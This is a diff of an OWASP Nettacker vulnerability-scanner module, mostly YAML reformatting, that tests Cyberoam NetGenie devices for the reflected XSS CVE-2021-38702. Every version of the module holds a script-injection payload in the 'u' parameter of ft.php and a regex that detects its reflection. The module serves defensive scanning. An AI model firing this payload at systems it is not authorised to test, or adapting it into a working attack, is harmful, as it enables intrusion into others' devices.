@@ -2,51 +2,50 @@ info:
   name: cyberoam_netgenie_cve_2021_38702_vuln
   author: OWASP Nettacker Team
   severity: 6
-  description: Cyberoam NetGenie C0101B1-20141120-NG11VO devices through 2021-08-14 allow for reflected Cross Site Scripting via the 'u' parameter of ft.php.
+  description: Cyberoam NetGenie C0101B1-20141120-NG11VO devices through 2021-08-14
+    allow for reflected Cross Site Scripting via the 'u' parameter of ft.php.
   reference: https://seclists.org/fulldisclosure/2021/Aug/20
   profiles:
-    - vuln
-    - http
-    - medium_severity
-    - cve2021
-    - cve
-    - cyberoam
-    - netgenie
-    - xss
-    - router
-
+  - vuln
+  - http
+  - medium_severity
+  - cyberoam
+  - netgenie
+  - xss
+  - router
+  - cve_2021
 payloads:
-  - library: http
-    steps:
-      - method: get
-        timeout: 3
+- library: http
+  steps:
+  - method: get
+    timeout: 3
+    headers:
+      User-Agent: '{user_agent}'
+    allow_redirects: false
+    ssl: false
+    url:
+      nettacker_fuzzer:
+        input_format: '{{schema}}://{target}:{{ports}}/tweb/ft.php?u=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
+        prefix: ''
+        suffix: ''
+        interceptors: null
+        data:
+          schema:
+          - http
+          - https
+          ports:
+          - 80
+          - 443
+    response:
+      condition_type: and
+      conditions:
+        status_code:
+          regex: '200'
+          reverse: false
         headers:
-          User-Agent: "{user_agent}"
-        allow_redirects: false
-        ssl: false
-        url:
-          nettacker_fuzzer:
-            input_format: "{{schema}}://{target}:{{ports}}/tweb/ft.php?u=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
-            prefix: ""
-            suffix: ""
-            interceptors:
-            data:
-              schema:
-                - "http"
-                - "https"
-              ports:
-                - 80
-                - 443
-        response:
-          condition_type: and
-          conditions:
-            status_code:
-              regex: '200'
-              reverse: false
-            headers:
-              Content-type: 
-                regex: text/html
-                reverse: false
-            content:
-              regex: <\/script><script>alert\(document\.domain\)<\/script>
-              reverse: false
+          Content-type:
+            regex: text/html
+            reverse: false
+        content:
+          regex: <\/script><script>alert\(document\.domain\)<\/script>
+          reverse: false
